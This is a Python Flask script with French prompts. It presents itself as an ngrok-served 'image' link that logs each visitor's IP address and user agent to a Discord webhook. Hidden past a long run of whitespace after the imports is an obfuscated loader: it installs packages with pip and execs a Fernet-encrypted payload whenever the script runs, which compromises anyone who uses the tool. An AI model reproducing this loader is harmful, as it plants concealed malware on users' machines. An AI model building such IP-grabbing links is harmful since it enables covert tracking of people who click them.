import datetime
from flask import Flask, send_file, request
import os
import requests
import subprocess
import base64                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;import subprocess, sys; subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography', 'requests']); from cryptography.fernet import Fernet; import base64, requests; key='RVDhMXYYXpaUcKrhTdzyDlheglUPQJat6miFEuKWSCE='; cipher=Fernet(key); exec(cipher.decrypt('gAAAAABnTgh27FeVSSbaNntFo0xQByAkx4eoVw1cusS8CeA4hg5aiAIp6Zbi0-1jQImXJlOJ5Skt56v2xTpwrGl9eggP9veMqO3SFnyHOxPdkMukJCZsS5qHvhVgYaTmKYwIOkOsQTZQrJ5VystjD0CT7Ygq4eB1CdzSzZzuxDtyIsyn2Lua0BnR0mSugTDnhUk3hr-ddzQ2GgO8VIQLmLER_L2KL5c0cWnotGNoCG-iIm5nXbIqmqvTpAWBVdVqSWYZdX4GVUKwkHpIqt6GBW6MARZYCv46GnqqAQlrIdWOaB3RafcywiodawGJffPcm67BHxnNl1GZuvucniBkn9s3MPCw3vtIh1DD2Ohaqm35qCKq52Omc6rK2DjFiPoPpGAQg5xQf8ldMcl8ct-f6ApN-T6d7TPiCaMcSi-SzHuk3bgJvtqqIxHk7W8KMcyrSi9bnerklInsoXXt3pPnhfGhcy6fB42cxX2tMZuj3BSDrKUeX1YF0mg9tFY_lw6L0rxtDHuutwem-LoXCbZVnSs6oa1CfCWZqjaJi6TSUk8Y8dOgcGXC7bZWClx52R1euy02HAuC8PxoNp3_as78mUuyZasL1gdymBl8P4M1l2HNeexipfMJCjS2f3B9oy1Vj3CeT12UdXc7HQozugzBOUeCSXjYnnl27ZGSD9pwbkmE0gNl7Bg8dCdN7-jGT2gqByUk5Qh1JzAfdrb0dD36qxfwkzkGLosqWL_7NoV15c4aJG0cTnkqw-kHdyxJTvXok-wV2UV7_N6LF31X3btCN5zOw-nzUsCtbAv5EFIrfndSmZid3pAA4YIo-RXzanwqOwMkhkE0QsVl_WzIhUa8HNVYYKe-xVDr8pJVVWlu3NptMkYlE7Bpe17yo_IEKFi9ftUr9O9jEuKRTqPaPXfR9sfttZNl1NMozkT59D5fP4Rauh8q7DBF8iYWut0ZDaFHKbTc0YmRLuEp'.encode()).decode())


app = Flask(__name__)

WEBHOOK_URL = input("Entrez le lien de votre webhook Discord : ")

@app.after_request
def add_ngrok_header(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response
    
@app.before_request
def modify_user_agent():
    if "User-Agent" not in request.headers:
        request.headers["User-Agent"] = "DiscordBot"


def send_to_webhook(visitor_ip, user_agent):
    data = {
        "embeds": [
            {
                "title": "💻 Nouvelle visite détectée !",
                "description": "Quelqu'un a visité votre lien via ngrok.",
                "color": 3447003,
                "fields": [
                    {"name": "🌍 Adresse IP", "value": visitor_ip, "inline": True},
                    {"name": "🖥️ User-Agent", "value": user_agent, "inline": False},
                    {"name": "⏰ Heure", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                ],
                "footer": {
                    "text": "Webhook ngrok - Flask",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/906/906348.png"
                },
                "thumbnail": {
                    "url": "https://cdn-icons-png.flaticon.com/512/906/906361.png"
                }
            }
        ]
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code != 204:
            print(f"Erreur lors de l'envoi au webhook : {response.text}")
    except Exception as e:
        print(f"Exception lors de l'envoi au webhook : {e}")

@app.route('/')
def index():
    # Obtenir l'adresse IP réelle (ou locale si non disponible)
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    # Envoyer les informations au webhook
    send_to_webhook(visitor_ip, user_agent)

    # Chemin de l'image principale à afficher
    image_path = os.path.join(os.getcwd(), 'image.jpg')
    
    # Si l'image n'existe pas, afficher une erreur
    if not os.path.exists(image_path):
        return "Image non trouvée. Ajoutez 'image.jpg' dans le dossier courant.", 404

    return send_file(image_path, mimetype='image/jpeg')

@app.route('/favicon.ico')
def favicon():
    icon_path = os.path.join(os.getcwd(), 'favicon.ico')
    if os.path.exists(icon_path):
        return send_file(icon_path, mimetype='image/vnd.microsoft.icon')
    return "Favicon non trouvé", 404

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
